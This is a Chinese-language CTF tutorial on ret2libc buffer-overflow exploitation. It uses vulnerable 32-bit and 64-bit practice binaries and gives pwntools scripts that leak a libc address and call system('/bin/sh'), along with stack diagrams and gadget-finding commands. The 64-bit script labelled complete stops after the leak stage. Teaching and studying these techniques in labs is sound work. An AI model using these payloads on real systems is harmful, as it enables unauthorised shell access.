## 1. 例题1：32位 ret2libc 完整利用

### 1.1 利用思路

```
┌─────────────────────────────────────────────────────────────┐
│  完整的 ret2libc 攻击分为以下 5 个步骤：                       │
│                                                             │
│  1. 第一次溢出使用 puts 函数泄露 libc 地址                    │
│  2. 根据 libc 地址确定 libc 版本                              │
│  3. 计算 system 函数的位置以及 /bin/sh 字符串的位置            │
│  4. 返回至 start 函数重入溢出点                               │
│  5. 执行 system(/bin/sh)                                    │
└─────────────────────────────────────────────────────────────┘
```

### 1.2 为什么需要"返回至 start 重入"？

```
问题：
  第一次溢出用于泄露地址，但泄露后程序会继续执行
  如果直接 return 到无效地址，程序会崩溃，无法进行第二次利用

解决方案：
  将第一次溢出的返回地址设为 start（或 main）函数
  这样程序会重新执行 vuln 函数，给我们第二次溢出的机会

执行流程：

  第一次溢出：
    payload = padding + puts_plt + start_addr + puts_got
                                    ↑
                              泄露后返回这里，重新进入漏洞函数

  第二次溢出：
    payload = padding + system_addr + fake_ret + binsh_addr
    → 执行 system("/bin/sh") → getshell!
```

### 1.3 程序源码推测

```c
#include <stdio.h>
#include <string.h>
#include <unistd.h>

void vuln() {
    char buf[40];  // 缓冲区大小
    write(1, "Hello World\n", 12);
    read(0, buf, 0x64);  // 读取 100 字节，远超缓冲区大小 → 溢出！
}

int start() {
    setvbuf(stdin, 0LL, 2, 0);
    setvbuf(stdout, 0LL, 2, 0);
    vuln();
    return 0;
}
```

### 1.4 关键信息

| 项目 | 值 |
|------|-----|
| 缓冲区大小 | 40 字节（0x28） |
| 读取大小 | 0x64 = 100 字节 |
| 溢出偏移 | 0x28 + 4 = 44 字节（缓冲区 + 保存的 EBP） |
| 可用函数 | puts（用于泄露） |
| libc 文件 | libc-2.31_32.so |

## 2. 32位 Exploit 代码详解（exp32.py）

### 2.1 完整代码

```python
from pwn import *

s = process("./ret2libc_32")
elf = ELF("./ret2libc_32")
libc = ELF("./libc-2.31_32.so")
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

gdb.attach(s, "b *0x0804850C\nc")

# ── 第一次溢出：泄露 puts 地址 ──
payload = b'A' * 0x28 + b'B' * 4 + p32(puts_plt) + p32(0x080483C0) + p32(puts_got)
s.sendafter("Hello World\n", payload)

# ── 接收泄露的地址并计算 libc 基址 ──
libc.address = u32(s.recv(4)) - libc.sym['puts']
success(hex(libc.address))

# ── 第二次溢出：执行 system("/bin/sh") ──
payload = b'A' * 0x28 + b'B' * 4 + p32(libc.sym['system']) + p32(0x080483C0) + p32(next(libc.search(b'/bin/sh')))
s.sendafter("Hello World\n", payload)

s.interactive()
```

### 2.2 代码逐步解析

#### 第一阶段：泄露 puts 地址

```python
payload = b'A' * 0x28 + b'B' * 4 + p32(puts_plt) + p32(0x080483C0) + p32(puts_got)
```

栈布局：

```
低地址
├── 'A' * 0x28 (40字节)     ← 填充 buf[40]
├── 'B' * 4                 ← 覆盖保存的 EBP
├── puts_plt                ← 覆盖返回地址，调用 puts()
├── 0x080483C0              ← puts 的返回地址（start 函数，重入漏洞）
└── puts_got                ← puts 的参数（泄露 puts 的真实地址）
高地址
```

执行流程：
```
vuln() return → puts@plt(puts@got) → 输出 puts 的真实地址
                → return 到 0x080483C0 (start) → 重新进入 vuln()
```

#### 第二阶段：计算 libc 基地址

```python
libc.address = u32(s.recv(4)) - libc.sym['puts']
```

- `s.recv(4)`：接收 puts 输出的 4 字节地址（32位）
- `u32(...)`：将 4 字节小端数据转为整数
- `libc.sym['puts']`：puts 在 libc 文件中的偏移
- `libc.address = ...`：设置 libc 基地址，之后 `libc.sym['system']` 会自动计算真实地址

#### 第三阶段：执行 system("/bin/sh")

```python
payload = b'A' * 0x28 + b'B' * 4 + p32(libc.sym['system']) + p32(0x080483C0) + p32(next(libc.search(b'/bin/sh')))
```

栈布局：

```
低地址
├── 'A' * 0x28              ← 填充 buf[40]
├── 'B' * 4                 ← 覆盖保存的 EBP
├── libc.sym['system']      ← 覆盖返回地址，调用 system()
├── 0x080483C0              ← system 的返回地址（无所谓）
└── next(libc.search('/bin/sh'))  ← system 的参数
高地址
```

### 2.3 偏移量计算说明

```
buf[40] 的大小 = 0x28 = 40 字节
保存的 EBP = 4 字节
总偏移 = 0x28 + 4 = 44 字节

为什么是 'A'*0x28 + 'B'*4？
  - 'A' * 0x28：填满 buf[40]
  - 'B' * 4：覆盖保存的 EBP（4字节）
  - 接下来就是返回地址的位置
```

## 3. 例题2：64位 ret2libc

### 3.1 题目描述

> 整体逻辑与上一题一致，但是程序加固改为了64位。

### 3.2 64位程序源码

```c
#include <stdio.h>
#include <string.h>
#include <unistd.h>

ssize_t vuln() {
    char buf[32];  // [rsp+0h] [rbp-20h] BYREF
    setvbuf(stdin, 0LL, 2, 0);
    setvbuf(stdout, 0LL, 2, 0);
    puts("Hello World");
    return read(0, buf, 0x64LL);  // 读取 100 字节，缓冲区只有 32 字节 → 溢出！
}
```

### 3.3 关键差异

| 项目 | 32位 | 64位 |
|------|------|------|
| 缓冲区大小 | 40 字节 (0x28) | 32 字节 (0x20) |
| 地址长度 | 4 字节 (p32) | 8 字节 (p64) |
| 传参方式 | 栈传参 | **寄存器传参** |
| 偏移计算 | 0x28 + 4 = 44 | 0x20 + 8 = 40 |

---

## 4. 64位与32位的关键差异

### 4.1 传参方式

> 利用思路不变，但是需要注意64位的传参方式与32位不同。

**64位程序使用的是寄存器传参，顺序如下：**

```
第1个参数 → rdi
第2个参数 → rsi
第3个参数 → rdx
第4个参数 → rcx
第5个参数 → r8
第6个参数 → r9
其余参数 → 栈传递
```

### 4.2 为什么需要 gadget？

```
32位：参数在栈上
  [返回地址] → system@plt
  [fake_ret] → 0x0
  [arg1]     → /bin/sh 地址
  → system 自动从栈上取参数

64位：第一个参数在 rdi 寄存器
  [返回地址] → system@plt
  [fake_ret] → 0x0
  [arg1]     → /bin/sh 地址（在栈上，但 system 不会从栈取！）
  → system 从 rdi 取参数，但 rdi 不是 /bin/sh 地址！

解决方案：
  使用 pop rdi; ret gadget
  先将 /bin/sh 地址 pop 到 rdi，再调用 system
```

### 4.3 pop_rdi gadget 的作用

```
gadget: pop rdi; ret

执行流程：
  1. ret 跳转到 pop_rdi gadget
  2. pop rdi：从栈顶弹出一个值到 rdi 寄存器
  3. ret：跳转到下一个地址（system@plt）

栈布局：
  [pop_rdi 地址]    ← 返回地址
  [/bin/sh 地址]    ← pop rdi 弹出到 rdi
  [system@plt]      ← pop_rdi 的 ret 跳转到这里
  [fake_ret]        ← system 的返回地址
  （system 此时 rdi = /bin/sh 地址）
```

## 5. 64位 Exploit 代码详解（exp64.py）

### 5.1 完整代码

```python
from pwn import *

s = process("./ret2libc_64")
gdb.attach(s, "b *0x40067D\nc")

elf = ELF("./ret2libc_64")
libc = ELF("./libc-2.31_64.so")
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']

pop_rdi = 0x0000000000400703

# ── 第一次溢出：泄露 puts 地址 ──
payload = b'A' * 0x20 + b'B' * 8 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(0x400530)
s.sendafter("Hello World\n", payload)

# ── 接收泄露的地址并计算 libc 基址 ──
libc.address = u64(s.recvuntil('\x7f')[-6:] + b"\x00\x00") - libc.sym['puts']
success(hex(libc.address))

s.interactive()
```

### 5.2 代码逐步解析

#### 第一阶段：泄露 puts 地址

```python
payload = b'A' * 0x20 + b'B' * 8 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(0x400530)
```

栈布局：

```
低地址
├── 'A' * 0x20 (32字节)     ← 填充 buf[32]
├── 'B' * 8                 ← 覆盖保存的 RBP（64位是8字节）
├── pop_rdi                 ← 返回地址，跳转到 pop rdi; ret
├── puts_got                ← pop rdi 弹出到 rdi（puts 的参数）
├── puts_plt                ← pop_rdi 的 ret 跳转到 puts@plt
└── 0x400530                ← puts 的返回地址（start 函数，重入）
高地址
```

执行流程：
```
vuln() return → pop_rdi gadget
  → pop rdi: rdi = puts_got
  → ret: 跳转到 puts@plt
  → puts(puts_got): 输出 puts 的真实地址
  → return 到 0x400530 (start): 重新进入 vuln()
```

#### 接收泄露地址

```python
libc.address = u64(s.recvuntil('\x7f')[-6:] + b"\x00\x00") - libc.sym['puts']
```

**为什么这样接收？**

- `s.recvuntil('\x7f')`：接收直到遇到 `\x7f`（libc 地址通常以 `\x7f` 开头，如 `0x7f...`）
- `[-6:]`：取最后 6 字节（64位地址的有效部分）
- `+ b"\x00\x00"`：补齐到 8 字节（64位地址需要8字节）
- `u64(...)`：转为 64 位整数
- `- libc.sym['puts']`：计算 libc 基地址

```
示例：
  puts 真实地址 = 0x00007f1234567890
  recvuntil('\x7f') 收到: b'\x90\x78\x56\x34\x12\x7f'
  [-6:] = b'\x90\x78\x56\x34\x12\x7f'
  + b"\x00\x00" = b'\x90\x78\x56\x34\x12\x7f\x00\x00'
  u64(...) = 0x00007f1234567890
```

### 5.3 偏移量计算

```
buf[32] 的大小 = 0x20 = 32 字节
保存的 RBP = 8 字节（64位）
总偏移 = 0x20 + 8 = 40 字节

32位 vs 64位 偏移对比：
  32位：0x28 + 4 = 44 字节（EBP 是 4 字节）
  64位：0x20 + 8 = 40 字节（RBP 是 8 字节）
```

## 6. 32位 vs 64位 对比总结

### 6.1 核心差异对比表

| 对比项 | 32位 (x86) | 64位 (x64) |
|--------|-----------|-----------|
| **地址长度** | 4 字节 | 8 字节 |
| **打包函数** | `p32()` / `u32()` | `p64()` / `u64()` |
| **传参方式** | 栈传参（从右到左压栈） | 寄存器传参（rdi, rsi, rdx, rcx, r8, r9） |
| **保存的基址指针** | EBP（4字节） | RBP（8字节） |
| **是否需要 gadget** | 通常不需要（参数在栈上） | **需要** pop_rdi 等 gadget |
| **泄露地址接收** | `u32(s.recv(4))` | `u64(s.recvuntil('\x7f')[-6:] + b"\x00\x00")` |
| **payload 构造** | `padding + func + ret + arg` | `padding + pop_rdi + arg + func + ret` |

### 6.2 Payload 构造对比

#### 32位 payload（泄露阶段）

```python
payload = padding + puts_plt + start_addr + puts_got
#                        ↑函数    ↑返回地址   ↑参数（在栈上）
```

#### 64位 payload（泄露阶段）

```python
payload = padding + pop_rdi + puts_got + puts_plt + start_addr
#                        ↑gadget  ↑参数→rdi  ↑函数    ↑返回地址
```

#### 32位 payload（攻击阶段）

```python
payload = padding + system_addr + fake_ret + binsh_addr
#                        ↑函数      ↑无所谓    ↑参数（在栈上）
```

#### 64位 payload（攻击阶段）

```python
payload = padding + pop_rdi + binsh_addr + system_addr + fake_ret
#                        ↑gadget   ↑参数→rdi   ↑函数      ↑无所谓
```

### 6.3 完整知识链

```
ret2libc 完整利用流程（32位 & 64位通用）
│
├── 1. 信息收集
│   ├── checksec 检查保护机制
│   ├── 确定架构（32位/64位）
│   ├── 查找可用函数（puts/printf/write 等）
│   └── 获取 libc 文件
│
├── 2. 第一次溢出（泄露阶段）
│   ├── 32位：padding + puts_plt + start + puts_got
│   ├── 64位：padding + pop_rdi + puts_got + puts_plt + start
│   ── 接收泄露的函数地址
│
├── 3. 计算 libc 基地址
│   ├── libc_base = leaked_addr - libc.sym['func']
│   ── 设置 libc.address（pwntools 自动计算其他符号地址）
│
├── 4. 第二次溢出（攻击阶段）
│   ├── 32位：padding + system + fake_ret + binsh
│   ├── 64位：padding + pop_rdi + binsh + system + fake_ret
│   └── 执行 system("/bin/sh")
│
└── 5. 获得 shell
    └── s.interactive()
```

### 6.4 关键要点

| 要点 | 说明 |
|------|------|
| 64位必须用 gadget | 参数通过寄存器传递，需要 pop_rdi 等 gadget 设置参数 |
| gadget 查找 | `ROPgadget --binary ./binary --only "pop\|ret"` |
| 64位地址接收技巧 | 用 `recvuntil('\x7f')` 接收，因为 libc 地址以 `\x7f` 结尾（小端序） |
| 重入漏洞函数 | 第一次泄露后返回 start/main，确保能第二次溢出 |
| 偏移量计算 | 32位：buf_size + 4；64位：buf_size + 8 |

## 附录：常用命令速查

### 查找 gadget

```bash
# 查找 pop rdi; ret
ROPgadget --binary ./binary --only "pop|ret" | grep "pop rdi"

# 查找所有可用 gadget
ROPgadget --binary ./binary --ropchain
```

### GDB 调试

```bash
# 附加调试
gdb.attach(s, "b *0x40067D\nc")

# 查看栈内容
x/20gx $rsp

# 查看寄存器
info registers rdi rsi rdx
```

### pwntools 常用 API

```python
# 32位
p32(addr)    # 打包
u32(data)    # 解包

# 64位
p64(addr)    # 打包
u64(data)    # 解包

# ELF 分析
elf.plt['puts']      # PLT 地址
elf.got['puts']      # GOT 地址
elf.sym['main']      # 符号地址

# libc 分析
libc.sym['system']           # system 偏移
libc.sym['puts']             # puts 偏移
next(libc.search(b'/bin/sh'))  # /bin/sh 偏移
```

> **学习建议**：先掌握32位的 ret2libc（参数在栈上，更直观），再学习64位（需要理解寄存器传参和 gadget）。建议用 GDB 逐步调试，观察每次溢出后栈和寄存器的变化。
